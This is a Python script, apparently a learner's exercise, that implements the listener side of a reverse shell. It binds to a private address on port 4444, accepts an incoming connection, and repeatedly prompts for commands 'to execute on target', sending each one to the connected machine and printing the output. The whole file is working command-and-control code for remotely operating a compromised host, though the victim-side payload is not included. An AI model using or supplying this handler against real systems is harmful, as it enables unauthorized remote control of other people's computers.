import socket, sys


class Listener:
    
    
    def __init__(self,ip,port):
        self.listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        self.listener.bind((str(ip),port)) #bind to this machine! 127.0.0.1 might work to? 
        self.listener.listen(0)
        print('Starting listener... waiting for connection') #add a threading spinner here
        try:
            self.connection,address = self.listener.accept() #address is tuple with address and port
        except KeyboardInterrupt:
            print('\nSIGINT caught, exiting...')
            sys.exit()
        #print(connection) #connection is the socket object with information about local address and remote address
        print('Connection established with ' + str(address[0]) + ' on port ' + str(address[1]))
        print('Enter \'bye\' to close connection')
    
    
    def executeCmd(self,cmd):
        cmd = str(cmd).encode('utf-8')
        self.connection.send(cmd)
        result = self.connection.recv(1024)
        result = result.decode()
        return result #calling.executeCmd will return the result of the command sent by run()



    def run(self): #so my run() function will need to do the exit call logic, execCmd just needs to send and receive the command from run
        while True:
            inputChecker = False
            while inputChecker == False:
                cmd = input('Enter command to execute on target:')
                if cmd == '':
                    print('Command must not be blank')
                else:
                    inputChecker = True
            if cmd != 'bye':
                result = self.executeCmd(cmd) 
                print(result)
            else:
                print('Exit call received, closing connection')
                self.listener.close()
                sys.exit() 
          

listener = Listener('10.211.55.5',4444)


try:
    listener.run()
except KeyboardInterrupt:
    print('Interrupt caught, exiting...')
    sys.exit()


